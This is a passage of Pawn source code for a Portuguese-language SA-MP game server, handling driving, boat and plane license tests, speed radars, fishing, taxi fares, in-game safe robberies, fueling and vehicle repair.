		        format(string, sizeof string, "[AUTO ESCOLA] Ainda lhe resta(m) %d chance(s) para concluir esse teste.", TestChancesT);
		        SendClientMessage(id, COLOUR_RED, string);
		        
		    }
		}
		
		else
		{
		    SendClientMessage(id, COLOUR_RED, "Teste concluído... Muito Bem!");
		    TestPartT++;
		    TogglePlayerControllable(id, false);
		}

		SetTimer("LicenseTestT", 3000, false);
	}
	
	else if(TestPartT == 6)
	{
	    new xpath[128];
		new hab, habn, haba;
		
		xpath = GetPlayerXFilePath(id);
		hab = hGetInt(xpath, "Hab");
		habn = (hab >> 1) & 0x1;
		haba = hab & 0x1;
		
	    RemovePlayerFromVehicle(id);
		TogglePlayerControllable(id, true);

	    for(new dsc = 0; dsc < sizeof DRIVING_SCHOOL_CAR; dsc++)
	    {
	        SetVehicleParamsForPlayer(DRIVING_SCHOOL_CAR[dsc], id, 0, 1);
	        SetVehicleToRespawn(DRIVING_SCHOOL_CAR[dsc]);
	    }

        SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Parabéns! Você concluiu o teste.");
        SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Você recebeu a habilitação para dirigir carros e motos.");
	    hSetInt(xpath, "Hab", (1 << 2) | ((habn & 0x1) << 1) | (haba & 0x1));
        TestPlayerT = INVALID_PLAYER_ID;
	    TestPartT = 0;
	    TestChancesT = 0;
	    DeleteTimer(TestTimerT);
	    SetPlayerPos(id, 1746.6401, -2061.8796, 13.5998);
	    
	    if(GetPlayerSysMoney(id) < 800)
	    {
	        SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Como você não tinha o dinheiro em mãos, ele foi descontado do banco.");
	        hSetInt(xpath, "Bank", hGetInt(xpath, "Bank") - 800);
	    }

	    else
			GivePlayerSysMoney(id, -800);
	}
}

public LicenseTestN()
{
    new id;

	id = TestPlayerN;

	if(id == INVALID_PLAYER_ID || !IsPlayerConnected(id) || !IsPlayerLogged(id))
	    return;
	    
	if(TestPartN == 0)
	{
	    SetPlayerInterior(id, 0);
		SetVehicleToRespawn(DRIVING_SCHOOL_BOAT[0]);
		PutPlayerInVehicle(id, DRIVING_SCHOOL_BOAT[0], 0);
		TogglePlayerControllable(id, true);
		DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, 724.7454, -1887.7563, -0.2853, 370.4259, -1979.7917, -0.0267, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Vá indo até os checkpoints para concluir o teste.");
	}
	
	else if(TestPartN == 1)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, 370.4259, -1979.7917, -0.0267, 156.2574, -2003.4746, -0.1966, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Indo para o oceano...");
	}
	
	else if(TestPartN == 2)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, 156.2574, -2003.4746, -0.1966, -274.1814, -1878.7067, -0.0038, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Passando por baixo da rua...");
	}
	
	else if(TestPartN == 3)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, -274.1814, -1878.7067, -0.0038, -319.1227, -1858.7415, -0.1333, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Navegando próximo ao farol.");
	}
	
	else if(TestPartN == 4)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, -319.1227, -1858.7415, -0.1333, -404.7655, -1846.5375, 0.0759, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Passagem estreita, pilote cuidadosamente.");
	}
	
	else if(TestPartN == 5)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, -404.7655, -1846.5375, 0.0759, -391.5101, -1870.4409, -0.2303, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Muito bem, continue...");
	}
	
	else if(TestPartN == 6)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, -391.5101, -1870.4409, -0.2303, -260.6551, -1878.7949, -0.0563, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Agora dê meia volta...");
	}
	
	else if(TestPartN == 7)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, -260.6551, -1878.7949, -0.0563, 382.8111, -2111.5026, -0.1190, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Pilote cuidadosamente para sair...");
	}
	
	else if(TestPartN == 8)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, 382.8111, -2111.5026, -0.1190, 982.3859, -2222.1418, -0.0964, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Retornando...");
	}
	
	else if(TestPartN == 9)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, 982.3859, -2222.1418, -0.0964, 709.1412, -2226.1748, -0.0992, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Hmm, pelo jeito está havendo pescaria por aqui.");
	}
	
	else if(TestPartN == 10)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, 709.1412, -2226.1748, -0.0992, 724.2630, -1905.1837, -0.0321, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Ótimo, continue...");
	}
	
	else if(TestPartN == 11)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 0, 724.2630, -1905.1837, -0.0321, 728.3168, -1497.0704, 0.3344, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Quase lá...");
	}
	
	else if(TestPartN == 12)
	{
	    DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 1, 728.3168, -1497.0704, 0.3344, 0.0, 0.0, 0.0, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Muito bem, agora retorne ao ponto de partida para ser avaliado.");
	}
	
	else if(TestPartN == 13)
	{
		new Float:H;

		GetVehicleHealth(DRIVING_SCHOOL_BOAT[0], H);

		if(H < 900)
		{
			SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Você falhou no seu teste, o barco foi danificado...");
			TestPartN = 0;
		}

		else
		{
		    SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Você foi aprovado no seu teste... Meus Parabéns!");
		    TestPartN++;
		}

		SetTimer("LicenseTestN", 3000, false);
	}

	else if(TestPartN == 14)
	{
	    new xpath[128];
		new hab, habt, haba;

		xpath = GetPlayerXFilePath(id);
		hab = hGetInt(xpath, "Hab");
	    habt = (hab >> 2) & 0x1;
		haba = hab & 0x1;
		
        SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Você recebeu a habilitação para pilotar barcos.");
	    hSetInt(xpath, "Hab", ((habt & 0x1) << 2) | (1 << 1) | (haba & 0x1));
        RemovePlayerFromVehicle(id);
		SetVehicleToRespawn(DRIVING_SCHOOL_BOAT[0]);
        TestPlayerN = INVALID_PLAYER_ID;
		TestPartN = 0;
		SetPlayerPos(id, 723.4153, -1492.4016, 1.9343);
        SetVehicleParamsForPlayer(DRIVING_SCHOOL_BOAT[0], id, 0, 1);
        
        if(GetPlayerSysMoney(id) < 1500)
		{
		    SendClientMessage(id, COLOUR_GREEN, "Como você não tem dinheiro em mãos, o pagamento foi descontado do Banco.");
			hSetInt(xpath, "Bank", hGetInt(xpath, "Bank") - 1500);
		}

		else
            GivePlayerSysMoney(id, -1500);
	}
}

public LicenseTestA()
{
    new id;

	id = TestPlayerA;

	if(id == INVALID_PLAYER_ID || !IsPlayerConnected(id) || !IsPlayerLogged(id))
	    return;
	    
	if(TestPartA == 0)
	{
		SetPlayerInterior(id, 0);
		SetVehicleToRespawn(DRIVING_SCHOOL_PLANE[0]);
		PutPlayerInVehicle(id, DRIVING_SCHOOL_PLANE[0], 0);
		TogglePlayerControllable(id, true);
		DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 3, 1458.2427, -2493.7332, 14.4762, 759.8234, -1702.5314, 93.2056, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Vá indo até os checkpoints para concluir o teste.");
	}

	else if(TestPartA == 1)
	{
		DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 3, 759.8234, -1702.5314, 93.2056, -2492.0488, 881.2453, 191.7513, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] O vôo vai começar, puxe o leme para ganhar altura... Procure não danificar o avião.");
	}
	
	else if(TestPartA == 2)
	{
		DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 3, -2492.0488, 881.2453, 191.7513, -2294.8837, 2298.8991, 170.9315, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Mantenha a altitude para não perder estabilidade.");
	}
	
	else if(TestPartA == 3)
	{
		DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 3, -2294.8837, 2298.8991, 170.9315, 92.0137, 1778.5743, 214.6118, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Sobrevoando San Fierro...");
	}
	
	else if(TestPartA == 4)
	{
		DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 3, 92.0137, 1778.5743, 214.6118, 1137.8576, 1404.9718, 114.3429, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Muito bem, continue...");
	}
	
	else if(TestPartA == 5)
	{
		DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 3, 1137.8576, 1404.9718, 114.3429, 1974.3586, -2594.1790, 13.4428, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Estamos sobrevoando uma Base Militar agora, pilote cuidadosamente...");
	}
	
	else if(TestPartA == 6)
	{
		DisablePlayerRaceCheckpoint(id);
		SetPlayerRaceCheckpoint(id, 4, 1974.3586, -2594.1790, 13.4428, 0.0, 0.0, 0.0, 20.0);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Sobrevoando Las Venturas... agora retorne ao Aeroporto Internacional de Los Santos.");
	}
	
	else if(TestPartA == 7)
	{
		DisablePlayerRaceCheckpoint(id);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Pouse o avião...");
		TestPartA++;
		SetTimer("LicenseTestA", 8000, false);
	}
	
	else if(TestPartA == 8)
	{
		new Float:H;
		
		GetVehicleHealth(DRIVING_SCHOOL_PLANE[0], H);
		
		if(H < 900)
		{
			SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Você falhou no seu teste, o avião foi danificado...");
			TestPartA = 0;
		}
		
		else
		{
		    SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Você foi aprovado no seu teste... Meus Parabéns!");
		    TestPartA++;
		}
		
		SetTimer("LicenseTestA", 3000, false);
	}
	
	else if(TestPartA == 9)
	{
	    new xpath[128];
		new hab, habt, habn;
		
		xpath = GetPlayerXFilePath(id);
		hab = hGetInt(xpath, "Hab");
	    habt = (hab >> 2) & 0x1;
		habn = (hab >> 1) & 0x1;
		
        SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Você recebeu a habilitação para pilotar aviões e helicópteros.");
	    hSetInt(xpath, "Hab", ((habt & 0x1) << 2) | ((habn & 0x1) << 1) | 1);
	    RemovePlayerFromVehicle(id);
		SetVehicleToRespawn(DRIVING_SCHOOL_PLANE[0]);
        TestPlayerA = INVALID_PLAYER_ID;
		TestPartA = 0;
		SetPlayerPos(id, 1961.4064, -2205.3679, 13.5468);
        SetVehicleParamsForPlayer(DRIVING_SCHOOL_PLANE[0], id, 0, 1);
        
        if(GetPlayerSysMoney(id) < 2400)
		{
		    SendClientMessage(id, COLOUR_GREEN, "Como você não tem dinheiro em mãos, o pagamento foi descontado do Banco.");
			hSetInt(xpath, "Bank", hGetInt(xpath, "Bank") - 2400);
		}

		else
            GivePlayerSysMoney(id, -2400);
	}
}

public CheckTestT()
{
    new id;

	id = TestPlayerT;

	if(id == INVALID_PLAYER_ID || !IsPlayerConnected(id) || !IsPlayerLogged(id))
	{
		DeleteTimer(TestTimerT);
	    return;
	}

	if(IsPlayerInAnyVehicle(id))
	{
	    new vehid;
		new Float:H;

		vehid = GetPlayerVehicleID(id);
	    GetVehicleHealth(vehid, H);
	    
	    if(H < 1000)
	    {
	        TestChancesT--;
			RemovePlayerFromVehicle(id);
			SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Teste falhado... Seu veículo foi danificado.");
			
			if(TestChancesT > 0)
			{
			    new string[128];
			    format(string, sizeof string, "[AUTO ESCOLA] Ainda lhe resta(m) %d chance(s) para concluir o teste.", TestChancesT);
			    SendClientMessage(id, COLOUR_RED, string);
			}
			
			SetTimer("LicenseTestT", 3000, false);
			SetVehicleToRespawn(vehid);
	    }
	    
	    else if(TestPartT == 0)
	    {
			if(IsVehicleInArea(vehid, 1769.0464, -2077.6221, 1775.7255, -2075.1553) && CheckAng(id, 90))
			{
			    TestPartT++;
                TestChancesT = 3;
			    TogglePlayerControllable(id, false);
				SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Teste concluído...");
				SetTimer("LicenseTestT", 3000, false);
			}
	    }
	    
	    else if(TestPartT == 1)
	    {
	        if(IsVehicleInArea(vehid, 1807.8981, -2025.0101, 1812.1422, -2021.3784) && CheckAng(id, 270))
			{
			    TestPartT++;
                TestChancesT = 3;
			    TogglePlayerControllable(id, false);
				SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Teste concluído...");
				SetTimer("LicenseTestT", 3000, false);
			}
	    }
	    
	    else if(TestPartT == 2)
	    {
            if(IsVehicleInArea(vehid, 1797.1978, -2050, 1800.7753, -2047.9780) && CheckAng(id, 87))
			{
			    TestPartT++;
                TestChancesT = 3;
                TogglePlayerControllable(id, false);
				SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Teste concluído...");
				SetTimer("LicenseTestT", 3000, false);
			}
	    }
	    
	    else if(TestPartT == 3)
	    {
            if(IsVehicleInArea(vehid, 1774.2667, -2028.1365, 1775.6932, -2027.4597))
            {
                TestPartT++;
                TestChancesT = 3;
                TogglePlayerControllable(id, false);
				SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Teste concluído...");
				SetTimer("LicenseTestT", 3000, false);
            }
	    }
	}
}

public TakeObject(objectid)
	DestroyObject(objectid);
	
public StopAnimation(playerid)
	ClearAnimations(playerid);

public VoteKick()
{
    new string[128];
    
	if(Votes >= PlayerCount)
	{
	    format(string, sizeof string, "[VOTEKICK] Votação para kickar %s sucedida, jogador kickado do servidor.", PlayerName(VoteKickPlayer));
	    SendClientMessageToAll(COLOUR_LIGHT_YELLOW, string);
	    Kick(VoteKickPlayer);
	}
	else
	{
	    format(string, sizeof string, "[VOTEKICK] Votação para kickar %s falhada, a quantidade de votos necessária não foi atendida.", PlayerName(VoteKickPlayer));
		SendClientMessageToAll(COLOUR_LIGHT_YELLOW, string);
	}
	
	Votes = 0;
	VoteKickPlayer = -1;

	for(new n = 0; n < MAX_SLOTS; n++)
	    Voted[n] = 0;
	
	PlayerCount = 0;
	DeleteTimer(VoteKickTimer);
}

public Speedometer()
{
    for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && IsPlayerInAnyVehicle(n) && GetPlayerState(n) == PLAYER_STATE_DRIVER)
	    {
	        new string[128];
			new vehid, model, F;
	        new Float:V, Float:H, Float:VP[3];
	        new bool:rc, bool:unlimited;
	        
	        vehid = GetPlayerVehicleID(n);
	        
	        if(IsVehicleForSale(vehid))
	            continue;
			
			model = GetVehicleModel(vehid);
			GetVehiclePos(vehid, VP[0], VP[1], VP[2]);
			GetVehicleHealth(vehid, H);
			V = GetDistance2D(VP[0], VP[1], VCoords[n][0], VCoords[n][1]) * 3.6;
			rc = unlimited = false;
			
			for(new dsc = 0; dsc < sizeof DRIVING_SCHOOL_CAR; dsc++)
			{
			    if(vehid == DRIVING_SCHOOL_CAR[dsc])
			        unlimited = true;
			}
			
			for(new dsb = 0; dsb < sizeof DRIVING_SCHOOL_BOAT; dsb++)
			{
			    if(vehid == DRIVING_SCHOOL_BOAT[dsb])
			        unlimited = true;
			}
			
			for(new dsp = 0; dsp < sizeof DRIVING_SCHOOL_PLANE; dsp++)
			{
			    if(vehid == DRIVING_SCHOOL_PLANE[dsp])
			        unlimited = true;
			}
			
			if(!unlimited)
			{
				if(IsRCModel(model))
				    rc = true;
			    
				if(!rc)
					F = GetVehicleFuel(vehid);

				else
				    F = hGetInt(GetPlayerXFilePath(n), "Battery");
			
				if(!rc)
				{
				    VCounter[n] = (VCounter[n] + 1) % 30;

					if(F == 0)
					{
					    if(!(VFrozenFlags[n] & VFROZEN_NO_GAS))
					    {
					        if(VFrozenFlags[n] == 0)
					        {
					    		TogglePlayerControllable(n, false);
					    		TextDrawShowForPlayer(n, tdvehicle);
							}

							VFrozenFlags[n] |= VFROZEN_NO_GAS;
					    	DrawTextForPlayer(n, "Veículo sem combustível.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
						}
					}

			        else if(VCounter[n] == 0)
			        {
			            if(F > 0 && F <= 100)
			            {
			            	F--;
		            		SetVehicleFuel(vehid, F);
			            }
					}
				}
			
				else
				{
				    VCounter[n] = (VCounter[n] + 1) % 12;

				    if(VCounter[n] == 0)
				    {
				    	if(F > 100)
				    	    F = 100;

						else
					    	F--;

					    if(F <= 0)
					    {
					        F = 0;
					        RemovePlayerFromVehicle(n);
					        DestroyVehicle(vehid);
				    	    CurrentToy[n] = -1;
				        	DrawTextForPlayer(n, "Brinquedo sem bateria.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
				    	}

				    	hSetInt(GetPlayerXFilePath(n), "Battery", F);
					}
				}
			}
			
			else
			    F = 100;
			    
			for(new r = 0; r < sizeof Radar; r++)
			{
			    if(GetDistance(VP[0], VP[1], VP[2], Radar[r][rdX], Radar[r][rdY], Radar[r][rdZ]) <= Radar[r][rdRadius])
			    {
			        format(string, sizeof string, "[RADAR] %d / %d KM/H", floatround(V), floatround(Radar[r][rdLimit]));
					SendClientMessage(n, COLOUR_SKY_BLUE, string);
					
					if(!(RadarFlags[n] & 0x1))
					{
					    new plate[128], suspect[MAX_PLAYER_NAME];
					    
					    if(!IsPlayerVehicle(vehid))
					        format(plate, sizeof plate, "VSR %d", vehid + 1000);

						else
					        plate = hGetString(GetVehicleFilePath(vehid), "NumberPlate");
					        
						if(IsPlayerVehicle(vehid) && hGetInt(GetVehicleFilePath(vehid), "Params") & 4)
						    suspect = ("Desconhecido");
						    
						else
							GetPlayerName(n, suspect, sizeof suspect);
  	  	
					    RadarFlags[n] |= 1;
					    format(string, sizeof string, "Suspeito: %s - Local: %s - Modelo: %s - Placa: %s", suspect, Radar[r][rdRef], Vehicles[GetVehicleModel(vehid) - 400][vehModel], plate);
						SendClientMessageToPolice(COLOUR_SKY_BLUE, string);
						SetTimerEx("ZeroRadarFlags", 6250, false, "d", n);
					}
					
			        if(V > Radar[r][rdLimit] && !(RadarFlags[n] & 2) && !IsJobVehicle(vehid, POLICE_CAR) && !IsJobVehicle(vehid, AMBULANCE))
			        {
			            new xvpath[128];
			            new fine;
			            
			            if(TestPlayerT == n && TestPartT == 4)
						{
						    TestPartT--;
			    			TestChancesT--;
   							TogglePlayerControllable(n, false);
							SendClientMessage(n, COLOUR_RED, "[AUTO ESCOLA] Teste falhado... Você ultrapassou a velocidade imposta pelo radar ¬¬'");
                            format(string, sizeof string, "[AUTO ESCOLA] Ainda lhe resta(m) %d chance(s) para concluir esse teste.", TestChancesT);
		        			SendClientMessage(n, COLOUR_RED, string);
							SetTimer("LicenseTestT", 3000, false);
							break;
      					}
		            		
			            fine = 50 + floatround((V - Radar[r][rdLimit]) * 2.5);
			            fine -= fine % 50;
			            
						if(IsServerVehicle(vehid))
						{
						    fine /= 2;
						    xvpath = GetPlayerXFilePath(n);
						    SendClientMessage(n, COLOUR_SKY_BLUE, "Sua empresa recebeu uma multa e você foi o responsável, metade do valor foi desviado para sua multa pessoal.");
						}
						
						else
						{
							xvpath = GetVehicleFilePath(vehid);
							SendClientMessage(n, COLOUR_SKY_BLUE, "[RADAR] Veículo multado por ultrapassar o limite de velocidade imposto pelo radar.");
						}
						
						RadarFlags[n] |= 2;
						hSetInt(xvpath, "Fine", hGetInt(xvpath, "Fine") + fine);
						format(string, sizeof string, "Valor da multa: $%d,00 dólares.", fine);
						SendClientMessage(n, COLOUR_SKY_BLUE, string);
						DrawTextForPlayer(n, "Multado!", COLOUR_RED, TEXTDRAW_STYLE_3, 4000);
						SetTimerEx("ZeroRadarFlags", 6250, false, "d", n);
			        }
			        
			        break;
			    }
			}
			
			format(string, sizeof string, "%dkm/h", floatround(V));
			TextDrawSetString(tdspeed[n], string);
			
			for(new p = 0; p < 2; p++)
			    VCoords[n][p] = VP[p];
			    
            if(floatround(H) != VHealthText[n])
			    UpdatePlayerHealthText(n);
	    }
	}
}

public ZeroRadarFlags(playerid)
	RadarFlags[playerid] = 0;

public Fishery(playerid)
{
    new xpath[128], string[128], animlib[32], animname[32];
	new rand, level, skill, dis;
	new Float:X, Float:Y, Float:Z;
		
	if(Fishing[playerid] == 0)
	    return 1;

    GetPlayerPos(playerid, X, Y, Z);
	GetAnimationName(GetPlayerAnimationIndex(playerid), animlib, sizeof animlib, animname, sizeof animname);

    if(strcmp(animlib, "SWIM", true) == 0)
	{
	    new money;

        Fishing[playerid] = 0;
	 	money = (11 + random(40)) % 10;
	 	
		GivePlayerSysMoney(playerid, -money);
		format(string, sizeof string, "Tsc Tsc... Você saiu do barco e os peixes escaparam... Prejuízo: $%d,00 dólares.", money);
	    SendClientMessage(playerid, COLOUR_GRAY, string);
		return 1;
	}
		
	if(Area[playerid] != AREA_FISH)
	{
	    Fishing[playerid] = 0;
	    SendClientMessage(playerid, COLOUR_GRAY, "Pesca cancelada! Você saiu da área.");
	    return 1;
	}

	xpath = GetPlayerXFilePath(playerid);
	skill = hGetInt(xpath, "FishingSkill");
	dis = floatround(GetDistance(X, Y, Z, 544.4256, -2177.3381, 35.7031)) / 80;
	
	if(skill < 30)
		rand = random(112), level = 1;

	else if(skill < 60)
		rand = random(90), level = 2;

	else if(skill < 90)
		rand = random(86), level = 3;

	else if(skill < 150)
		rand = random(82), level = 4;

	else
		rand = random(78), level = 5;

    skill++;
    rand += dis * 5;
	hSetInt(xpath, "FishingSkill", skill);
	hSetInt(xpath, "Bait", hGetInt(xpath,"Bait") - 1);

	if(rand <= 77)
	{
	    new fish, mass;

	    fish = random(sizeof Fishes);
	    mass = random(9) + 2;
	    hSetInt(xpath, "Fish", hGetInt(xpath,"Fish") + Fishes[fish][fishPrice] * mass);

	    format(string, sizeof string, "Você pescou um(a) %s de %dkg, esse peixe vale $%d,00 dólares por kilograma", Fishes[fish][fishName], mass, Fishes[fish][fishPrice]);
	    SendClientMessage(playerid, COLOUR_FISHER, string);
		format(string, sizeof string, "Agora seu pescado vale $%d,00 dólares.", hGetInt(xpath,"Fish"));
		SendClientMessage(playerid, COLOUR_FISHER, string);
	}

	else
	{
	 	new money;

	 	money = (11 + random(40)) % 10;

		GivePlayerSysMoney(playerid, -money);
		format(string, sizeof string, "Você não pescou nada e recebeu um prejuízo de $%d,00 dólares.", money);
	    SendClientMessage(playerid, COLOUR_FISHER, string);
	}

    Fishing[playerid] = 0;
	format(string,sizeof string,"Experiência de Pesca: %d <> Nível: %d/5.", skill, level);
	SendClientMessage(playerid, COLOUR_FISHER, string);
	return 1;
}

public Taxi(playerid, plid, vehicleid, textid)
{
	new string[128];
	
	if(!IsPlayerConnected(playerid) || !IsPlayerConnected(plid))
	{
	    TextDrawHideForPlayer(playerid, Text:textid);
	    TextDrawHideForPlayer(plid, Text:textid);
	    TextDrawDestroy(Text:textid);
	    Taximeter[playerid] = Taximeter[plid] = -1;
	    return;
	}
	
	if(GetPlayerSysMoney(plid) < Taximeter[playerid] || GetPlayerState(playerid) != PLAYER_STATE_DRIVER || !IsPlayerInVehicle(playerid, vehicleid) || !IsPlayerInVehicle(plid, vehicleid))
	{
		if(IsPlayerInVehicle(plid, vehicleid))
		    RemovePlayerFromVehicle(plid);
		    
	    TextDrawHideForPlayer(playerid, Text:textid);
	    TextDrawHideForPlayer(plid, Text:textid);
	    TextDrawDestroy(Text:textid);
	    Pay(playerid, Taximeter[playerid]);
	    GivePlayerSysMoney(plid, -Taximeter[playerid]);
	    Taximeter[playerid] = Taximeter[plid] = -1;
	    return;
	}
	
	Taximeter[playerid] += 2;
	format(string, sizeof string, "~y~Taxímetro: ~g~$~w~%d,00 dólares", Taximeter[playerid]);
	TextDrawSetString(Text:textid, TEXT(string));
	SetTimerEx("Taxi", 3500, false, "dddd", playerid, plid, vehicleid, textid);
}

public Assaulting(playerid, textid)
{
	new string[128];
	new safe, rob, point;
	new bool:ok, bool:robflag;
	
	safe = Rob[playerid] >> 24;
	robflag = !!((Rob[playerid] >> 23) & 0x1);
	rob = Rob[playerid] & 0x7FFFFF;
	ok = true;
	
	if(Rob[playerid] == 0)
	    ok = false;
	    
    if(!IsPlayerConnected(playerid))
	    ok = false;

    if(!ok)
	{
  		Rob[playerid] = 0;
  		TextDrawHideForPlayer(playerid, Text:textid);
  		TextDrawDestroy(Text:textid);
  		ClearAnimations(playerid);
  		return;
	}
	
	if(!robflag)
 	{
 	    point = GetSafePoint(safe);
 	    Rob[playerid] |= 0x800000;
  		SetPlayerPos(playerid, SafePoints[point][safepointX], SafePoints[point][safepointY], SafePoints[point][safepointZ]);
		SetPlayerFacingAngle(playerid, SafePoints[point][safepointA]);
		format(string, sizeof string, "Para parar o roubo pressione ~y~%s", GetKeyName(K_ROB, 1));
 		DrawTextForPlayer(playerid, string, COLOUR_WHITE, TEXTDRAW_STYLE_2, 3000);
 		DissolveTextBlack(playerid, 0xFF);
		ApplyAnimation(playerid, "ROB_BANK", "CAT_Safe_Rob", 4.1, 1, 1, 1, 1, -1, 1);
		SetTimerEx("Assaulting", 3000, false, "dd", playerid, textid);
	}
		
	else
	{
	    rob += random(21) + 10;
	    ApplyAnimation(playerid, "ROB_BANK", "CAT_Safe_Rob", 4.1, 1, 1, 1, 1, -1, 1);
	    
		if(rob >= Safes[safe][sMoney] && ok)
		{
		    if(Safes[safe][sMoney] > 0)
		        Pay(playerid, Safes[safe][sMoney]);
	        
		    ok = false;
		    Safes[safe][sMoney] = 0;
		    DrawTextForPlayer(playerid, "Cofre vazio.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		}
	
		if(ok)
		{
			Rob[playerid] = (safe << 24) | (rob & 0xFFFFFF);
			format(string, sizeof string, "~b~Roubo: ~g~$~w~%d,00 dólares", Rob[playerid] & 0xFFFFFF);
			TextDrawSetString(Text:textid, TEXT(string));
    		SetTimerEx("Assaulting", 3000, false, "dd", playerid, textid);
		}
		
		else
		{
  			Rob[playerid] = 0;
  			TextDrawHideForPlayer(playerid, Text:textid);
  			TextDrawDestroy(Text:textid);
  			ClearAnimations(playerid);
		}
	}
}

public Fueling(playerid, vehicleid, start, amount, textid)
{
	new string[128];
	new liters, total;

	liters = random(3) + 1;

	if(amount < liters)
	    liters = amount;

	amount -= liters;
	total = GetVehicleFuel(vehicleid) + liters;

	if(total > 100)
	    total = 100;

	SetVehicleFuel(vehicleid, total);

	if(amount)
	{
	    format(string, sizeof string, "~b~Litros: ~w~%d~b~L~n~Total: ~w~%d~b~L~n~Preço: ~w~$%d,00", total - start, total, (total - start) * FUEL_COST);
	    TextDrawSetString(Text:textid, TEXT(string));
		SetTimerEx("Fueling", 320, false, "ddddd", playerid, vehicleid, start, amount, textid);
	}
	
	else
	{
	    TextDrawHideForPlayer(playerid, Text:textid);
	    TextDrawDestroy(Text:textid);
	    DrawTextForPlayer(playerid, "Veículo abastecido.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 2000);
	    VFrozenFlags[playerid] &= ~VFROZEN_FUEL;
	    
	    if(VFrozenFlags[playerid] == 0)
	    	TogglePlayerControllable(playerid, true);
	}
}

public Repairing(playerid, vehicleid, value, textid)
{
	new string[128];
	new Float:health, Float:total;
	
	GetVehicleHealth(vehicleid, health);
	total = health + 10.0;
	
	if(total >= 1000.0)
	{
	    TextDrawHideForPlayer(playerid, Text:textid);
	    TextDrawDestroy(Text:textid);
	    SetVehicleHealth(vehicleid, 1000.0);
	    RepairVehicle(vehicleid);
	    VFrozenFlags[playerid] &= ~VFROZEN_REPAIR;
	    
	    if(!IsPlayerInVehicle(playerid, vehicleid))
	    {
	        ApplyAnimation(playerid, "CAR", "Fixn_Car_Out", 4.1, 0, 1, 1, 1, -1, 1);
	        SetTimerEx("StopAnimation", 3000, false, "d", playerid);
		}
		
		else if(VFrozenFlags[playerid] == 0)
	    	TogglePlayerControllable(playerid, true);
	}
	
	else
	{
		value += 5;
		format(string, sizeof string, "~g~Integridade: ~w~%d~g~%%~n~Preço: ~w~$%d,00", floatround(total / 10.0), value);
		TextDrawSetString(Text:textid, TEXT(string));
		SetVehicleHealth(vehicleid, total);
		SetTimerEx("Repairing", 220, false, "dddd", playerid, vehicleid, value, textid);
	}
}

public Planting(playerid)
{
	new string[128];
	
	Corn[playerid] &= ~1;
	DeleteTimer(FarmerTimer[playerid]);
	
